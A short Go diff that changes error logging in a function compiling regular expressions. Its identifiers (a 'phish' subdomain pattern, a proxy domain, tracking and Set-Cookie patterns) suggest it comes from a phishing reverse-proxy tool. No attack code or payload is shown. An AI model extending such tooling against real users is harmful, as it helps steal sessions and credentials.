@@ -19,40 +19,40 @@ func MakeRegexes() {
 	regexpStr := MATCH_URL_REGEXP
 	RegexpUrl, err = regexp.Compile(regexpStr)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 
 	}
 
 	regexpStr = `(([a-z0-9.]+)+` + TopLevelDomain + `)`
 	RegexpSubdomainWithoutScheme, err = regexp.Compile(regexpStr)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 	}
 
 	regexpStr = `(?:([a-z0-9-]+|\*)\.)?` + ProxyDomain + `\b`
 	RegexpPhishSubdomainUrlWithoutScheme, err = regexp.Compile(regexpStr)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 	}
 
 	RegexpCookieTracking, err = regexp.Compile(TrackingCookie + TRACKING_COOKIE_REGEXP)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 	}
 
 	RegexpSubdomain, err = regexp.Compile(IS_SUBDOMAIN_REGEXP)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 	}
 
 	RegexpFindSetCookie, err = regexp.Compile(SET_COOKIE)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 	}
 
 	RegexpSetCookie, err = regexp.Compile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
 	if err != nil {
-		log.Fatalf(err.Error() + "Terminating.")
+		log.Fatalf("%v Terminating.", err)
 	}
 
 }
